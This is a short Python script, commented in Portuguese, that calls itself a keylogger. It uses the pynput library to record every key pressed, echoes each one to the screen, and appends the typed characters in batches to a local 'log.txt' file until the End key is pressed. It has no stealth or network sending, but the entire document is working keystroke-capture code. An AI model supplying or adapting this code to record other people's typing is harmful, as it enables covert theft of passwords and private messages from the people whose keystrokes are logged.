#dependencias para KEYLOGGER
import pynput
from pynput.keyboard import Key, Listener

#declarações
count = 0
keys = []
#Imprimirá na tela a tecla pressionada
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
#Escreve no file: "log.txt" o que está sendo digitado
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", " ")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") ==  -1:
                f.write(k)
#Para a execução assim que clicado em END no keyboard
def on_release(key):
    if key == Key.end:
        return False
#O sistema fica no LISTENER e se identificar algo, chama a função ON_PRESS ou ON_RELEASE
with Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()
